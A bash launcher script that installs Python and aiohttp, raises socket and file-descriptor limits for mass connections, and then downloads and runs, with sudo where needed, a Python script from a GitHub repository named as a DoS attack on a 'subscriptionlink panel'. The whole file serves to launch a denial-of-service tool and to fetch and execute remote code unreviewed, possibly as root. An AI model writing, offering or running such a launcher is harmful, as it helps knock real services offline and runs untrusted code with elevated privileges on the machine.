#!/bin/bash

# Exit on critical error
set -e

echo "=== Starting setup and prerequisites installation ==="

# 1. Update packages and install Python and necessary tools
if command -v apt &> /dev/null; then
    echo "[+] Updating repositories and installing Python3 and pip..."
    sudo apt update -y && sudo apt install -y python3 python3-pip curl wget
elif command -v yum &> /dev/null; then
    sudo yum install -y python3 python3-pip curl wget
elif command -v pacman &> /dev/null; then
    sudo pacman -Sy --noconfirm python python-pip curl wget
fi

# 2. Install aiohttp library
echo "[+] Installing aiohttp library..."
pip3 install aiohttp --break-system-packages 2>/dev/null || pip3 install aiohttp

# 3. Increase socket/file descriptor limit
echo "[+] Raising socket and file descriptor limits..."
# Try to set soft and hard limits to 10000 (or higher if you need)
if ! ulimit -n 10000 2>/dev/null; then
    echo "[!] Could not set ulimit -n to 10000. Trying sudo..."
    sudo bash -c 'ulimit -n 10000 && echo "Hard limit set to 10000"'
fi
# Optional: increase other limits (uncomment if needed)
# ulimit -u 10000   # max user processes
# ulimit -s 8192    # stack size

# 4. Download the main Python script from the repository
# Note: change the file name if your Python script has a different name
RAW_PYTHON_URL="https://raw.githubusercontent.com/coderuseplayer-netizen/subscriptionlink-panel-DoS-ATTACK/main/main.py"

echo "[+] Downloading main script..."
curl -fsSL "$RAW_PYTHON_URL" -o run.py

# 5. Make it executable and run the script
chmod +x run.py
echo "=== Running Python script with socket limit 10000 ==="
# Ensure the limit is inherited by the Python process
if [ "$(id -u)" -eq 0 ]; then
    # Already root, set limit directly
    ulimit -n 65535
    python3 run.py
else
    # Not root, try to set limit then run; if fails, use sudo to run with higher limit
    if ulimit -n 10000 2>/dev/null; then
        python3 run.py
    else
        echo "[!] Cannot raise ulimit as non-root. Running with sudo..."
        sudo bash -c 'ulimit -n 10000 && python3 run.py'
    fi
fi
